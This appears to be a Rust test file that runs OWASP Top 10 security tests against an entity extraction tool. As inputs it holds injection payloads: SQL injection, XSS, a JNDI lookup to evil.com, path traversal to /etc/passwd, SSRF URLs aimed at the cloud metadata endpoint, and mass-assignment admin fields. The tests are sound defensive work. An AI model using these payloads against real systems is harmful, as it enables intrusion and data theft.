// Entity Extraction Security Tests based on OWASP Top 10
// Tests for vulnerabilities in entity extraction from chronicle events

use std::sync::Arc;
use uuid::Uuid;
use chrono::Utc;
use serde_json::json;

use scribe_backend::{
    models::chronicle::CreateChronicleRequest,
    services::{
        ChronicleService,
        agentic::{
            narrative_tools::CreateChronicleEventTool,
            tools::{ScribeTool, ToolParams},
            entity_resolution_tool::{EntityResolutionTool, ProcessingMode},
        },
    },
    test_helpers::{spawn_app, TestDataGuard, db::create_test_user},
    errors::AppError,
};

/// OWASP A01:2021 – Broken Access Control
/// Verify entity extraction respects user boundaries and doesn't leak data across users
#[tokio::test]
async fn test_entity_extraction_respects_user_boundaries() {
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    // Create two users
    let user1 = create_test_user(&test_app.db_pool, "user1".to_string(), "password123".to_string()).await.unwrap();
    let user2 = create_test_user(&test_app.db_pool, "user2".to_string(), "password456".to_string()).await.unwrap();
    _guard.add_user(user1.id);
    _guard.add_user(user2.id);
    
    // Create chronicles for each user
    let chronicle_service = Arc::new(ChronicleService::new(test_app.db_pool.clone()));
    
    let chronicle1 = chronicle_service.create_chronicle(user1.id, CreateChronicleRequest {
        name: "User1's Private Chronicle".to_string(),
        description: Some("Contains sensitive entities".to_string()),
    }).await.unwrap();
    
    let chronicle2 = chronicle_service.create_chronicle(user2.id, CreateChronicleRequest {
        name: "User2's Chronicle".to_string(),
        description: Some("Should not access User1's entities".to_string()),
    }).await.unwrap();
    
    // Create entity resolution tool
    let entity_tool = EntityResolutionTool::new(
        test_app.app_state.clone()
    );
    
    // User1 creates entities in their chronicle
    let user1_entities = entity_tool.resolve_entities_multistage(
        "SecretAgent007 meets with classified contact M at headquarters",
        user1.id,
        Some(chronicle1.id),
        &[],
    ).await.unwrap();
    
    // User2 tries to extract the same entities - should not see User1's data
    let user2_entities = entity_tool.resolve_entities_multistage(
        "SecretAgent007 and M are mentioned",
        user2.id,
        Some(chronicle2.id),
        &[],
    ).await.unwrap();
    
    // Verify User2 gets new entities, not User1's existing ones
    assert!(!user2_entities.resolved_entities.is_empty());
    for entity in &user2_entities.resolved_entities {
        assert!(entity.is_new, "User2 should create new entities, not access User1's");
    }
    
    println!("✓ Access control test passed - entity extraction respects user boundaries");
}

/// OWASP A02:2021 – Cryptographic Failures
/// Ensure sensitive entity data is properly encrypted and not leaked
#[tokio::test]
async fn test_entity_extraction_handles_encrypted_data() {
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "crypto_user".to_string(), "secure123".to_string()).await.unwrap();
    _guard.add_user(user.id);
    
    let chronicle_service = Arc::new(ChronicleService::new(test_app.db_pool.clone()));
    let chronicle = chronicle_service.create_chronicle(user.id, CreateChronicleRequest {
        name: "Encrypted Entity Test".to_string(),
        description: Some("Testing entity extraction with encryption".to_string()),
    }).await.unwrap();
    
    // Create event with sensitive data that should be encrypted
    let sensitive_summary = "Agent's real name is John Doe, SSN: 123-45-6789, Credit Card: 4111111111111111";
    
    let chronicle_tool = CreateChronicleEventTool::new(
        chronicle_service.clone(),
        test_app.app_state.clone(),
    );
    
    let tool_params = json!({
        "user_id": user.id.to_string(),
        "chronicle_id": chronicle.id.to_string(),
        "event_type": "CLASSIFIED.IDENTITY.REVEAL",
        "action": "EXPOSED",
        "actors": [],
        "summary": sensitive_summary,
        "event_data": {
            "classified": true,
            "encryption_required": true
        },
        "timestamp_iso8601": Utc::now().to_rfc3339()
    });
    
    let result = chronicle_tool.execute(&tool_params).await;
    
    // Verify event was created but sensitive data is not exposed in plaintext
    assert!(result.is_ok());
    
    // When entity extraction occurs, it should not expose SSN or credit card
    let entity_tool = EntityResolutionTool::new(
        test_app.app_state.clone()
    );
    
    let entities = entity_tool.resolve_entities_multistage(
        sensitive_summary,
        user.id,
        Some(chronicle.id),
        &[],
    ).await.unwrap();
    
    // Verify no sensitive data patterns in extracted entities
    for entity in &entities.resolved_entities {
        assert!(!entity.name.contains("123-45-6789"), "SSN should not be in entity names");
        assert!(!entity.name.contains("4111111111111111"), "Credit card should not be in entity names");
        for prop in &entity.properties {
            assert!(!prop.contains("123-45-6789"), "SSN should not be in properties");
            assert!(!prop.contains("4111111111111111"), "Credit card should not be in properties");
        }
    }
    
    println!("✓ Cryptographic test passed - sensitive data not exposed in entities");
}

/// OWASP A03:2021 – Injection
/// Test entity extraction against injection attacks
#[tokio::test]
async fn test_entity_extraction_prevents_injection_attacks() {
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "injection_test".to_string(), "password123".to_string()).await.unwrap();
    _guard.add_user(user.id);
    
    let chronicle_service = Arc::new(ChronicleService::new(test_app.db_pool.clone()));
    let chronicle = chronicle_service.create_chronicle(user.id, CreateChronicleRequest {
        name: "Injection Test Chronicle".to_string(),
        description: Some("Testing injection prevention".to_string()),
    }).await.unwrap();
    
    // Attempt various injection attacks through entity names
    let injection_attempts = vec![
        r#"Robert'); DROP TABLE entities;--"#,
        r#"Alice", "admin": true, "evil": "payload"#,
        r#"<script>alert('XSS')</script>"#,
        r#"${jndi:ldap://evil.com/a}"#,
        r#"../../../etc/passwd"#,
        r#"{{ 7*7 }}"#, // Template injection
        r#"__proto__[admin]=true"#, // Prototype pollution
    ];
    
    let entity_tool = EntityResolutionTool::new(
        test_app.app_state.clone()
    );
    
    for (i, injection) in injection_attempts.iter().enumerate() {
        let summary = format!("{} meets with Bob at the location", injection);
        
        let result = entity_tool.resolve_entities_multistage(
            &summary,
            user.id,
            Some(chronicle.id),
            &[],
        ).await;
        
        match result {
            Ok(entities) => {
                // Verify entities are sanitized
                for entity in &entities.resolved_entities {
                    // Entity names should be sanitized
                    assert!(!entity.name.contains("DROP TABLE"));
                    assert!(!entity.name.contains("<script>"));
                    assert!(!entity.name.contains("${jndi"));
                    assert!(!entity.name.contains("../"));
                    assert!(!entity.name.contains("__proto__"));
                }
                println!("✓ Injection attempt {} handled safely", i + 1);
            }
            Err(e) => {
                // Error is acceptable for malicious input
                println!("✓ Injection attempt {} rejected with error: {}", i + 1, e);
            }
        }
    }
}

/// OWASP A04:2021 – Insecure Design
/// Test for design flaws in entity extraction logic
#[tokio::test]
async fn test_entity_extraction_design_security() {
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "design_test".to_string(), "password123".to_string()).await.unwrap();
    _guard.add_user(user.id);
    
    let chronicle_service = Arc::new(ChronicleService::new(test_app.db_pool.clone()));
    let chronicle = chronicle_service.create_chronicle(user.id, CreateChronicleRequest {
        name: "Design Security Test".to_string(),
        description: Some("Testing secure design principles".to_string()),
    }).await.unwrap();
    
    let entity_tool = EntityResolutionTool::new(
        test_app.app_state.clone()
    );
    
    // Test 1: Ensure rate limiting or resource constraints
    let massive_text = "Entity".repeat(10000); // 60K characters
    let result = entity_tool.resolve_entities_multistage(
        &massive_text,
        user.id,
        Some(chronicle.id),
        &[],
    ).await;
    
    // Should either succeed with reasonable limits or fail gracefully
    match result {
        Ok(entities) => {
            assert!(entities.resolved_entities.len() < 1000, "Should limit entity count");
            println!("✓ Resource limits enforced");
        }
        Err(_) => {
            println!("✓ Excessive input rejected");
        }
    }
    
    // Test 2: Verify no recursive entity resolution
    let recursive_text = "Alice knows Bob who knows Charlie who knows Alice";
    let entities = entity_tool.resolve_entities_multistage(
        recursive_text,
        user.id,
        Some(chronicle.id),
        &[],
    ).await.unwrap();
    
    // Should handle circular references without infinite loops
    assert!(entities.resolved_entities.len() <= 3, "Should not create duplicate entities");
    println!("✓ Circular reference handling verified");
}

/// OWASP A05:2021 – Security Misconfiguration
/// Test for security misconfigurations in entity extraction
#[tokio::test]
async fn test_entity_extraction_configuration_security() {
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "config_test".to_string(), "password123".to_string()).await.unwrap();
    _guard.add_user(user.id);
    
    // Test with different processing modes
    let entity_tool = EntityResolutionTool::new(
        test_app.app_state.clone()
    );
    
    // Verify default mode is secure
    let result = entity_tool.resolve_entities_multistage(
        "System administrator and root user",
        user.id,
        None,
        &[],
    ).await.unwrap();
    
    // Should not expose system internals
    for entity in &result.resolved_entities {
        assert_ne!(entity.entity_type, "SystemUser", "Should not create system user entities");
    }
    
    println!("✓ Configuration security test passed");
}

/// OWASP A07:2021 – Identification and Authentication Failures
/// Verify entity extraction requires proper authentication
#[tokio::test]
async fn test_entity_extraction_requires_authentication() {
    let test_app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let entity_tool = EntityResolutionTool::new(
        test_app.app_state.clone()
    );
    
    // Attempt with invalid user ID
    let invalid_user_id = Uuid::nil();
    let result = entity_tool.resolve_entities_multistage(
        "Alice and Bob",
        invalid_user_id,
        None,
        &[],
    ).await;
    
    // Should fail or handle gracefully
    match result {
        Ok(entities) => {
            // If it succeeds, ensure no sensitive operations occurred
            assert!(entities.resolved_entities.is_empty() || 
                   entities.resolved_entities.iter().all(|e| e.is_new),
                   "Should not access existing entities without auth");
        }
        Err(_) => {
            println!("✓ Invalid authentication rejected");
        }
    }
}

/// OWASP A08:2021 – Software and Data Integrity Failures
/// Test data integrity in entity extraction
#[tokio::test]
async fn test_entity_extraction_data_integrity() {
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "integrity_test".to_string(), "password123".to_string()).await.unwrap();
    _guard.add_user(user.id);
    
    let chronicle_service = Arc::new(ChronicleService::new(test_app.db_pool.clone()));
    let chronicle = chronicle_service.create_chronicle(user.id, CreateChronicleRequest {
        name: "Integrity Test".to_string(),
        description: Some("Testing data integrity".to_string()),
    }).await.unwrap();
    
    let entity_tool = EntityResolutionTool::new(
        test_app.app_state.clone()
    );
    
    // Create entities with specific properties
    let original_text = "Knight Arthur with sword Excalibur";
    let result1 = entity_tool.resolve_entities_multistage(
        original_text,
        user.id,
        Some(chronicle.id),
        &[],
    ).await.unwrap();
    
    // Extract again - should maintain consistency
    let result2 = entity_tool.resolve_entities_multistage(
        original_text,
        user.id,
        Some(chronicle.id),
        &[],
    ).await.unwrap();
    
    // Verify data integrity - same input should produce consistent results
    let arthur1 = result1.resolved_entities.iter().find(|e| e.name.contains("Arthur"));
    let arthur2 = result2.resolved_entities.iter().find(|e| e.name.contains("Arthur"));
    
    if let (Some(a1), Some(a2)) = (arthur1, arthur2) {
        assert_eq!(a1.entity_id, a2.entity_id, "Same entity should have same ID");
        assert_eq!(a1.entity_type, a2.entity_type, "Entity type should be consistent");
    }
    
    println!("✓ Data integrity test passed");
}

/// OWASP A09:2021 – Security Logging and Monitoring Failures
/// Verify entity extraction operations are properly logged
#[tokio::test]
async fn test_entity_extraction_logging() {
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "logging_test".to_string(), "password123".to_string()).await.unwrap();
    _guard.add_user(user.id);
    
    let entity_tool = EntityResolutionTool::new(
        test_app.app_state.clone()
    );
    
    // Attempt suspicious activity that should be logged
    let suspicious_inputs = vec![
        "ADMIN USER with DELETE permissions",
        "'; SELECT * FROM users; --",
        "<img src=x onerror=alert(1)>",
    ];
    
    for input in suspicious_inputs {
        let _ = entity_tool.resolve_entities_multistage(
            input,
            user.id,
            None,
            &[],
        ).await;
        
        // In a real system, we would verify logs were created
        // For this test, we just ensure the operation completes
        println!("✓ Processed suspicious input: {}", input);
    }
    
    println!("✓ Logging test completed - manual log verification required");
}

/// OWASP A10:2021 – Server-Side Request Forgery (SSRF)
/// Test entity extraction doesn't allow SSRF attacks
#[tokio::test]
async fn test_entity_extraction_prevents_ssrf() {
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "ssrf_test".to_string(), "password123".to_string()).await.unwrap();
    _guard.add_user(user.id);
    
    let entity_tool = EntityResolutionTool::new(
        test_app.app_state.clone()
    );
    
    // Attempt SSRF through entity names that look like URLs
    let ssrf_attempts = vec![
        "Entity from http://internal.server/admin",
        "Character at file:///etc/passwd",
        "NPC from http://169.254.169.254/latest/meta-data/",
        "Location https://localhost:8080/internal-api",
    ];
    
    for attempt in ssrf_attempts {
        let result = entity_tool.resolve_entities_multistage(
            attempt,
            user.id,
            None,
            &[],
        ).await;
        
        match result {
            Ok(entities) => {
                // Verify no network requests were made
                for entity in &entities.resolved_entities {
                    assert!(!entity.properties.iter().any(|p| p.contains("internal")));
                    assert!(!entity.properties.iter().any(|p| p.contains("/etc/")));
                    assert!(!entity.properties.iter().any(|p| p.contains("169.254")));
                }
                println!("✓ SSRF attempt blocked: {}", attempt);
            }
            Err(_) => {
                println!("✓ SSRF attempt rejected: {}", attempt);
            }
        }
    }
}

/// Additional test for mass assignment vulnerabilities
#[tokio::test]
async fn test_entity_extraction_prevents_mass_assignment() {
    let test_app = spawn_app(false, false, false).await;
    let mut _guard = TestDataGuard::new(test_app.db_pool.clone());
    
    let user = create_test_user(&test_app.db_pool, "mass_assign_test".to_string(), "password123".to_string()).await.unwrap();
    _guard.add_user(user.id);
    
    let chronicle_tool = CreateChronicleEventTool::new(
        Arc::new(ChronicleService::new(test_app.db_pool.clone())),
        test_app.app_state.clone(),
    );
    
    // Attempt to inject admin properties through tool parameters
    let malicious_params = json!({
        "user_id": user.id.to_string(),
        "chronicle_id": Uuid::new_v4().to_string(),
        "event_type": "TEST",
        "action": "CREATE",
        "actors": [],
        "summary": "Test event",
        "is_admin": true, // Should not be accepted
        "role": "super_admin", // Should not be accepted
        "permissions": ["DELETE_ALL"], // Should not be accepted
        "timestamp_iso8601": Utc::now().to_rfc3339()
    });
    
    let result = chronicle_tool.execute(&malicious_params).await;
    
    // Verify no privilege escalation occurred
    if let Ok(event_data) = result {
        assert!(!event_data.get("is_admin").is_some(), "Admin flag should not be set");
        assert!(!event_data.get("role").is_some() || 
                event_data.get("role").and_then(|v| v.as_str()) != Some("super_admin"),
                "Should not assign admin role");
        assert!(!event_data.get("permissions").is_some(), "Should not assign permissions");
    }
    
    println!("✓ Mass assignment test passed");
}